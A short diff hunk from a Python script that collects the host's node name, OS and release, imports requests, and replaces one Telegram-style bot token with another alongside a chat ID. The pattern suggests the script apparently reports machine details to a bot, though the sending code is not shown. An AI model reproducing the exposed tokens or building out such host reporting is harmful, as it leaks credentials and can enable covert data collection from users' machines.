@@ -7,7 +7,7 @@ from platform import release, system, node;
 node, system, rel = node(), system(), release()
 import requests
 
-token = '6412686424:AAFTWXNcqHcnlFAkpfZQkEBGRHMK3JC2EmQ'
+token = '6417268331:AAGcY2xKyhWbzTS3OH8IrR3WDaOcV_wRAx4'
 
 Id = '6157703844'
 
